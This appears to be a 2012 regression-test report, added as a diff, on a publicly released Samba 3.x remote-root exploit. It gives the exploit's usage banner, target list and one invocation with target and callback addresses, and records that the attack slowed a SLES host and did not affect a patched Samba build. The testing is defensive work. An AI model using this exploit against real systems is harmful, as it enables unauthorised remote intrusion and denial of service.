@@ -1,0 +1,48 @@
+Oct 2, 2012
+
+This is detail report for samba exploit regression testing.
+
+samba-201209-0day.py
+-------------------------------------------------------------------------
+Sept 25, 2012
+
+There's a samba exploit released to public in the mailinglist of
+Full-disclosure:
+
+http://lists.grok.org.uk/pipermail/full-disclosure/2012-September/088458.html
+
+I tested the exploit( http://pastebin.com/AwpsBWVQ) on the specific
+environment:
+
+---------------------------------------------------------
+OS: SLES 11 SP2
+samba: 3.6.3-0.18.3-2749-SUSE-CODE11-x86_64
+other: Turn off SUSE Firewall
+
+command-line:
++--------------------------------------------------------------------
+shawn@bt:/info_security/exploit-research/exps$ python samba-0day.py 
+
+ {*} samba 3.x remote root by kd(eax)@ireleaseyourohdayfuckyou {*}
+
+  usage: samba-0day.py <targethost> <targetport> <myip> <myport> <target>
+
+  targets:
+    00) samba_3.6.3-debian6
+    01) samba_3.5.11~dfsg-1ubuntu2.1_i386 (oneiric)
+    02) target_finder (hardcode correct system addr)
+
+shawn@bt:/info_security/exploit-research/exps$ python samba-0day.py
+147.2.212.96 139 147.2.215.224 8889 02
+{+} TRYING EIP=0xb6d1a3c0 OFFSET=0x00001f94
+
++--------------------------------------------------------------------
+Result: The target machine became very slow( unavailable to use). It
+seems like a DOS-similar attack. When I interrupted execution of the
+exploit, the target machine can work again but still slower than
+before attack.
+
+Then, I upgraded the samba to 3.6.3-0.24.4-2794-SUSE-CODE11-x86_64 by
+YaST. The target machine is fine after 30-mins attack. This exploit
+won't affect this samba version.
+-------------------------------------------------------------------------
